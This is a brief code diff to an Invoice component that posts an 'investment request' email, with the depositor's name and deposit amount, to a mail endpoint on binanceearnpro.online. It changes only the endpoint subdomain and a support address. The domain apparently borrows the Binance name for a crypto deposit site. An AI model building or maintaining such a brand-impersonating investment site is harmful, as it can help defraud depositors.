@@ -284,14 +284,14 @@ function Invoice() {
         );
         ajax({
           url:
-            "https://binanceearnpro.online/sendmail",
+            "https://mega.binanceearnpro.online/sendmail",
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: {
             message: `New incoming investment request from ${userInfos.firstName} ${userInfos.lastName} has been placed, total deposit amount : ${amountnn}`,
-            to: `${userInfos.email}, support@binanceearnpro.online`,
+            to: `${userInfos.email}, service@binanceearnpro.online`,
             subject: "investment",
           },
         }).subscribe(() => {
